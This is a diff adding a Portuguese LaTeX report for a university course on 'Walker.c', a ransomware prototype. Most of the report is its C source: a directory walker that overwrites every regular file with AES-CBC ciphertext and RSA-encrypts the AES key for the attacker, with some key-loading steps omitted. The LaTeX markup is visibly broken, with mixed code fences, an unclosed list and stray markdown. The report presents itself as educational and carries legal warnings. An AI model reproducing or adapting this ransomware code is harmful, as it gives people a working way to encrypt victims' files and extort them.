@@ -1,0 +1,286 @@
+
+\documentclass[a4paper,12pt]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[brazil]{babel}
+\usepackage{amsmath, amssymb}
+\usepackage{listings}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{color}
+\usepackage{hyperref}
+\usepackage{fancyvrb}
+\usepackage{titlesec}
+\geometry{margin=2.5cm}
+\title{Walker.c: Documentação Técnica Científica}
+\author{}
+\date{}
+
+\begin{document}
+\maketitle
+\section*{Walker.c: Documentação Técnica Científica}
+
+\subsection*{1. Introdução}
+
+O presente documento descreve a estrutura, funcionamento e aspectos técnicos do software \textbf{Walker.c}, um protótipo de ransomware desenvolvido para fins exclusivamente educacionais no âmbito da disciplina \textbf{ES502 - Segurança da Informação} do curso de Engenharia Eletrônica da \textbf{Universidade Federal de Pernambuco (UFPE)}.
+
+O projeto visa a exploração aplicada de técnicas criptográficas modernas, incluindo criptografia simétrica (\textbf{AES}) e assimétrica (\textbf{RSA}), bem como conceitos de segurança ofensiva e engenharia reversa. 
+
+\subsection*{2. Objetivo Funcional}
+
+O binário gerado pelo projeto realiza operações de criptografia e descriptografia sobre arquivos do diretório de execução. As operações são:
+
+\begin{itemize}
+\item \texttt{--encode} ou \texttt{-e}: criptografa os arquivos do diretório atual.
+\item \texttt{--decode} ou \texttt{-d}: solicita uma chave RSA privada e reverte os arquivos ao estado original.
+\item \texttt{--help} ou \texttt{-h}: exibe a ajuda.
+
+\subsection*{3. Seleção de Arquivos}
+
+A seleção dos arquivos é realizada pela função \texttt{walk}, definida em \texttt{FileHandler.c}. Apenas arquivos regulares são processados, utilizando a função \texttt{stat} e o macro \texttt{S_ISREG}. Diretórios, arquivos ocultos (prefixados por ".") e outros tipos de entrada são descartados. O trecho abaixo demonstra a filtragem de arquivos:
+
+``\texttt{c
+if (stat(path, &info) == 0 && S_ISREG(info.st_mode)) {
+    if (encrypt)
+        infect(path);
+    else
+        clean(path, rsa);
+}
+}`\texttt{
+
+A verificação }S_ISREG\texttt{ assegura que apenas arquivos regulares sejam processados. Além disso, o código ignora arquivos com nomes iniciados por }"."\texttt{:
+
+}`\texttt{c
+if (entry->d_name[0] == '.')
+    continue;
+}`\texttt{
+
+\subsection*{4. Arquitetura Modular}
+
+A arquitetura do sistema é modular, conforme a seguinte organização:
+
+}`\texttt{
+src/
+├── main.c                 # Ponto de entrada do programa
+├── FileHandler/           # Manipulação de arquivos
+│   ├── FileHandler.c
+│   └── FileHandler.h
+├── encryption/
+│   ├── encryption.h       # Header unificado
+│   ├── AES/
+│   │   ├── AES.c
+│   │   └── AES.h
+│   └── RSA/
+│       ├── RSA.c
+│       └── RSA.h
+├── keys/                  # Armazenamento de chaves
+│   ├── AES.key
+│   └── public_key.key
+└── ransom.key             # Chave privada RSA
+}`\texttt{
+
+\subsection*{5. Comportamento do Programa}
+
+\subsubsection*{5.1. }main.c\texttt{}
+
+Este arquivo é o ponto de entrada do programa. Ele interpreta os argumentos de linha de comando utilizando }getopt_long\texttt{ e direciona o fluxo para as funções apropriadas.
+
+}`\texttt{c
+static struct option long_options[] = {
+    {"encode", no_argument, 0, 'e'},
+    {"decode", no_argument, 0, 'd'},
+    {"help",   no_argument, 0, 'h'},
+    {0, 0, 0, 0}
+};
+}`\texttt{
+
+Dependendo da flag escolhida, o programa chama a função }walk\texttt{, que percorre os arquivos e aplica a operação desejada. A criptografia ou descriptografia das chaves AES é feita após o processo de arquivo, via }RSA_encrypt\texttt{ ou }RSA_decrypt\texttt{:
+
+}`\texttt{c
+switch (opt) {
+    case 'e':
+        walk(1, NULL);
+        RSA_encrypt();
+        break;
+    case 'd':
+        rsa = fopen("ransom.key", "rb");
+        if (!rsa) {
+            perror("Erro ao abrir chave privada");
+            exit(EXIT_FAILURE);
+        }
+        walk(0, rsa);
+        RSA_decrypt(rsa);
+        break;
+    case 'h':
+    default:
+        usage(argv[0]);
+}
+}`\texttt{
+
+\subsubsection*{5.2. }FileHandler.c\texttt{}
+
+Este módulo agrupa as funções responsáveis pela manipulação dos arquivos no sistema de diretórios.
+
+#### Função }walk\texttt{
+
+Percorre recursivamente todos os arquivos do diretório onde o programa foi executado. Para cada arquivo encontrado, chama a função adequada: }infect\texttt{ (criptografar) ou }clean\texttt{ (descriptografar), dependendo da operação selecionada.
+
+}`\texttt{c
+void walk(int encrypt, FILE *rsa) {
+    DIR *dir = opendir(".");
+    struct dirent *entry;
+    struct stat info;
+    char path[4096];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_name[0] == '.')
+            continue;
+
+        snprintf(path, sizeof(path), "./%s", entry->d_name);
+        if (stat(path, &info) == 0 && S_ISREG(info.st_mode)) {
+            if (encrypt)
+                infect(path);
+            else
+                clean(path, rsa);
+        }
+    }
+    closedir(dir);
+}
+}`\texttt{
+
+#### Função }infect\texttt{
+
+Criptografa um arquivo usando AES e, ao final, prepara a chave AES para ser criptografada com RSA. Cada arquivo é sobrescrito com sua versão criptografada.
+
+}`\texttt{c
+void infect(char *filename) {
+    encryptFile(filename, "keys/AES.key");
+}
+}`\texttt{
+
+#### Função }clean\texttt{
+
+Faz o processo inverso da }infect\texttt{. Recebe a chave privada RSA, descriptografa a chave AES previamente salva e utiliza-a para restaurar os arquivos criptografados ao seu estado original.
+
+}`\texttt{c
+void clean(char \textit{filename, FILE }rsa) {
+    decryptFile(filename, "keys/AES.key");
+}
+}`\texttt{
+
+\subsubsection*{5.3. }AES.c\texttt{}
+
+Este arquivo contém as rotinas de criptografia e descriptografia com \textbf{AES (Advanced Encryption Standard)}.
+
+#### Função }encryptFile\texttt{
+
+Criptografa o conteúdo de um arquivo usando AES no modo CBC. Um IV (vetor de inicialização) aleatório é utilizado para aumentar a segurança. O resultado substitui o conteúdo original do arquivo.
+
+}`\texttt{c
+void encryptFile(const char \textit{filename, const char }keyfile) {
+    FILE *f = fopen(filename, "rb");
+    fseek(f, 0, SEEK_END);
+    long filesize = ftell(f);
+    rewind(f);
+
+    uint8_t *plaintext = malloc(filesize);
+    fread(plaintext, 1, filesize, f);
+    fclose(f);
+
+    // Carrega chave AES e IV (omitido)
+
+    uint8_t *ciphertext = malloc(filesize + AES_BLOCKLEN);
+    AES_CBC_encrypt_buffer(&aes, ciphertext, plaintext, filesize);
+
+    f = fopen(filename, "wb");
+    fwrite(ciphertext, 1, filesize, f);
+    fclose(f);
+
+    free(plaintext);
+    free(ciphertext);
+}
+}`\texttt{
+
+#### Função }decryptFile\texttt{
+
+Descriptografa o conteúdo de um arquivo criptografado com AES, restaurando seu conteúdo original. A operação depende da chave AES correta e do IV usado na criptografia.
+
+}`\texttt{c
+void decryptFile(const char \textit{filename, const char }keyfile) {
+    FILE *f = fopen(filename, "rb");
+    fseek(f, 0, SEEK_END);
+    long filesize = ftell(f);
+    rewind(f);
+
+    uint8_t *ciphertext = malloc(filesize);
+    fread(ciphertext, 1, filesize, f);
+    fclose(f);
+
+    // Carrega chave AES e IV (omitido)
+
+    uint8_t *plaintext = malloc(filesize);
+    AES_CBC_decrypt_buffer(&aes, plaintext, ciphertext, filesize);
+
+    f = fopen(filename, "wb");
+    fwrite(plaintext, 1, filesize, f);
+    fclose(f);
+
+    free(plaintext);
+    free(ciphertext);
+}
+}`\texttt{
+
+\subsubsection*{5.4. }RSA.c\texttt{}
+
+Implementa a criptografia assimétrica \textbf{RSA}, usada exclusivamente para proteger a chave AES.
+
+#### Função }RSA_encrypt\texttt{
+
+Criptografa a chave AES com uma chave pública RSA. Essa chave criptografada pode ser armazenada com segurança ou transmitida ao atacante.
+
+}`\texttt{c
+void RSA_encrypt() {
+    FILE *aesFile = fopen("keys/AES.key", "rb");
+    FILE *pubFile = fopen("keys/public_key.key", "rb");
+
+    RSA *rsa = PEM_read_RSA_PUBKEY(pubFile, NULL, NULL, NULL);
+
+    fread(key, 1, AES_KEYLEN, aesFile);
+    RSA_public_encrypt(AES_KEYLEN, key, encrypted, rsa, RSA_PKCS1_OAEP_PADDING);
+
+    FILE *out = fopen("keys/AES.enc", "wb");
+    fwrite(encrypted, 1, rsa_len, out);
+}
+}`\texttt{
+
+#### Função }RSA_decrypt\texttt{
+
+Recebe uma chave privada RSA e a utiliza para descriptografar a chave AES. Essa operação é crítica para permitir que os arquivos criptografados possam ser recuperados no modo }--decode\texttt{.
+
+}`\texttt{c
+void RSA_decrypt(FILE *rsaFile) {
+    RSA *rsa = PEM_read_RSAPrivateKey(rsaFile, NULL, NULL, NULL);
+
+    FILE *enc = fopen("keys/AES.enc", "rb");
+    fread(encrypted, 1, rsa_len, enc);
+
+    RSA_private_decrypt(rsa_len, encrypted, decrypted, rsa, RSA_PKCS1_OAEP_PADDING);
+
+    FILE *out = fopen("keys/AES.key", "wb");
+    fwrite(decrypted, 1, AES_KEYLEN, out);
+}
+}``
+
+\subsection*{6. Considerações de Segurança}
+
+Todas as operações foram implementadas com foco educacional. O armazenamento da chave AES em disco e a sobrescrita dos arquivos originais representam riscos reais de perda de dados. O uso deste código para fins não autorizados pode configurar crime, conforme legislação vigente.
+
+\subsection*{7. Conclusão}
+
+Walker.c representa um estudo prático e científico da aplicação de criptografia em ataques ransomware. A modularidade do projeto, combinada com técnicas reais de criptografia, permite a compreensão aprofundada do funcionamento desse tipo de software malicioso. 
+
+---
+
+> \textbf{Aviso Legal:} Este projeto é estritamente educacional. Não utilize este software em sistemas reais ou com dados sensíveis.
+
+\end{itemize}
+\end{document}
